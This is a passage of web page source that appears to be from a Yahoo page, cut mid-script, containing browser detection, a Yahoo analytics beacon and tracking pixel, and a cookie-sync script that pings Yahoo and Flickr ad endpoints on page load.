D=Q.indexOf("Microsoft");var E=D!=-1&&A>=4;var I=(Q.indexOf("Netscape")!=-1||Q.indexOf("Opera")!=-1)&&A>=4;var O="undefined";var P=2000})();
+</script><script language="javascript">
+if(window.xzq_svr)xzq_svr('https://csc.beap.bc.yahoo.com/');
+if(window.xzq_p)xzq_p('yi?bv=1.0.0&bs=(134b57dto(gid$FPYT1zk4LjEXmPLlVqxWtgAjMTQuMVasv04JQO4M,st$1454161743214225,si$4465551,sp$97108935,pv$1,v$2.0))&t=J_3-D_3');
+if(window.xzq_s)xzq_s();
+</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(134b57dto(gid$FPYT1zk4LjEXmPLlVqxWtgAjMTQuMVasv04JQO4M,st$1454161743214225,si$4465551,sp$97108935,pv$1,v$2.0))&t=J_3-D_3"></noscript><script>(function(c){var d="https://",a=c&&c.JSON,e="ypcdb",g=document,b;function j(n,q,p,o){var m,r;try{m=new Date();m.setTime(m.getTime()+o*1000);g.cookie=[n,"=",encodeURIComponent(q),"; domain=",p,"; path=/; max-age=",o,"; expires=",m.toUTCString()].join("")}catch(r){}}function k(m){return function(){i(m)}}function i(n){var m,o;try{m=new Image();m.onerror=m.onload=function(){m.onerror=m.onload=null;m=null};m.src=n}catch(o){}}function f(o){var p="",n,s,r,q;if(o){try{n=o.match(/^https?:\/\/([^\/\?]*)(yahoo\.com|yimg\.com|flickr\.com|yahoo\.net|rivals\.com)(:\d+)?([\/\?]|$)/);if(n&&n[2]){p=n[2]}n=(n&&n[1])||null;s=n?n.length-1:-1;r=n&&s>=0?n[s]:null;if(r&&r!="."&&r!="/"){p=""}}catch(q){p=""}}return p}function l(B,n,q,m,p){var u,s,t,A,r,F,z,E,C,y,o,D,x,v=1000,w=v;try{b=location}catch(z){b=null}try{if(a){C=a.parse(p)}else{y=new Function("return "+p);C=y()}}catch(z){C=null}if(y){y=null}try{s=b.hostname;t=b.protocol;if(t){t+="//"}}catch(z){s=t=""}if(!s){try{A=g.URL||b.href||"";r=A.match(/^((http[s]?)\:[\/]+)?([^:\/\s]+|[\:\dabcdef\.]+)/i);if(r&&r[1]&&r[3]){t=r[1]||"";s=r[3]||""}}catch(z){t=s=""}}if(!s||!C||!t||!q){return}A=g.URL||b.href||"";E=f(A);if(!E||g.cookie.indexOf("ypcdb="+n)>-1){return}if(t===d){q=m}u=0;while(F=q[u++]){o=F.lastIndexOf("=");if(o!=-1){D=F.substr(1+o);x=C[D];if(x){setTimeout(k(t+F+x),w);w+=v}}}u=0;while(F=B[u++]){setTimeout(k(t+F),w);w+=v}setTimeout(function(){j(e,n,E,86400)},w)}function h(){l(['ads.yahoo.com/get-user-id?ver=2&s=800000001&type=redirect&ts=1454161743&sig=039e886bb1069f7a','ads.yahoo.com/get-user-id?ver=2&s=800000008&type=redirect&ts=1454161743&sig=adbec88eb9c8df3c'],'f6fbca2abd0c6d5a95804122e7a7d1af',['csync.flickr.com/csync?ver=2.1','csync.yahooapis.com/csync?ver=2.1'],['csync.flickr.com/csync?ver=2.1','csync.yahooapis.com/csync?ver=2.1'],'{"2.1":"&id=23351&value=1s67vfyonbyyz%26o%3d4%26q%3duWhZwYccLRW8FsqXAtdqZwSYKwgAly6A%26f%3d4z%26v%3dU14tvuHr9Pf8Cn28AX4M&optout=h%3d1&timeout=1454161743&sig=13n5tqkl5"}')}if(c.addEventListener){c.addEventListener("load",h,false)}else{if(c.attachEvent){c.attachEvent("onload",h)}else{c.onload=h}}})(window);
+</script>
+</body></html>
